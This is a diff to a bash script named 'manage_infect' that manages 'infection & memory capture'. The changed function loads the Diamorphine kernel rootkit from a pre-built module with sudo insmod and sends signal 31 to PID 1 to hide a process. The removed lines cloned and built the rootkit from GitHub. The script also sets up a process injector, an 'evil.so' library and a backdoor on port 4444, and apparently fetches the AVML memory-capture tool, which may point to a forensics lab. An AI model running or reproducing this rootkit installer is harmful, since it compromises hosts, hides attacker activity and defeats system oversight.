@@ -1,9 +1,8 @@
 #!/usr/bin/env bash
-
+# manage_infect – Infection & memory capture manager (rootkit pre-built)
 set -e
 
 ROOTKIT_MODULE="diamorphine"
-ROOTKIT_DIR="/tmp/Diamorphine"
 INJECTOR_DIR="/tmp/linux-inject"
 EVIL_LIB="/tmp/evil.so"
 BACKDOOR_PORT=4444
@@ -16,19 +15,31 @@ FLAG_BACKDOOR="/tmp/.backdoor_active"
 AVML_PATH="/tmp/avml"
 AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"
 
+# Locate the pre‑built rootkit module relative to this script
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+MODULE_PATH="$SCRIPT_DIR/assets/diamorphine.ko"
+
 # --- Install helpers ---
 install_rootkit() {
     if [ -f "$FLAG_ROOTKIT" ]; then
         echo "[*] Rootkit already installed."
         return 0
     fi
-    cd /tmp
-    [ -d "$ROOTKIT_DIR" ] || git clone https://github.com/m0nad/Diamorphine "$ROOTKIT_DIR"
-    cd "$ROOTKIT_DIR" && make
-    sudo insmod diamorphine.ko
-    sudo kill -31 1   # hide PID 1
+
+    if [ ! -f "$MODULE_PATH" ]; then
+        echo "[!] Pre‑built rootkit module not found at $MODULE_PATH"
+        echo "[!] Build it with: cd tools/diamorphine && make"
+        exit 1
+    fi
+
+    # Load the module only if it is not already in the kernel
+    if ! lsmod | grep -q "^${ROOTKIT_MODULE} "; then
+        sudo insmod "$MODULE_PATH"
+    fi
+
+    sudo kill -31 1   # hide PID 1 (Diamorphine magic signal)
     touch "$FLAG_ROOTKIT"
-    echo "[+] Rootkit loaded."
+    echo "[+] Rootkit loaded (pre‑built)."
 }
 
 install_injection() {
